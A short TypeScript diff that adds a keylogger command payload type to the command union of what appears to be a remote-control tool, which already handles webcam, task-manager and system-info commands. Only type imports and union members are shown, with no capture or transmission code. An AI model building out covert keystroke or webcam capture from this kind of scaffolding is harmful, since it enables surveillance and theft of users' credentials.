@@ -15,6 +15,7 @@ import type { ClientChatCommandPayload } from "./client-chat";
 import type { ToolActivationCommandPayload } from "./tool-activation";
 import type { WebcamCommandPayload } from "./webcam";
 import type { TaskManagerCommandPayload } from "./task-manager";
+import type { KeyloggerCommandPayload } from "./keylogger";
 import type { SystemInfoCommandPayload, SystemInfoSnapshot } from "./system-info";
 
 export type CommandName =
@@ -82,7 +83,8 @@ export type CommandPayload =
   | ClientChatCommandPayload
   | ToolActivationCommandPayload
   | WebcamCommandPayload
-  | TaskManagerCommandPayload;
+  | TaskManagerCommandPayload
+  | KeyloggerCommandPayload;
 
 export interface CommandInput {
   name: CommandName;
